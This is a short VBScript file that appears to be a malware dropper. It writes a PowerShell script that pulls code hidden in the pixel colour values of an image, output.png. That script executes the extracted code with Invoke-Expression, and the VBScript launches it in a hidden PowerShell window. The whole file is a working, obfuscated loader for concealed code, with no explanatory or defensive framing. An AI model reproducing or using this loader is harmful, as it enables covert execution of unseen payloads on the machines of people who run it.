Set fso = CreateObject("Scripting.FileSystemObject")
Set FileTemp = FSO.CreateTextFile( "run.ps1",ForAppending,TristateFalse)  
FileTemp.Write "sal a New-Object;Add-Type -A System.Drawing;$g=a System.Drawing.Bitmap("".\output.png"");$o=a Byte[] 1000;(0..0)|%{foreach($x in(0..999)){$p=$g.GetPixel($x,$_);$o[$_*1000+$x]=([math]::Floor(($p.B-band15)*16)-bor($p.G-band15))}};$g.Dispose();IEX([System.Text.Encoding]::ASCII.GetString($o[0..290]))"
currentpath = createobject("Scripting.FileSystemObject").GetFile(Wscript.ScriptFullName).ParentFolder.Path
CreateObject("shell.application").ShellExecute "powershell.exe", currentpath & "\run.ps1" ,,,0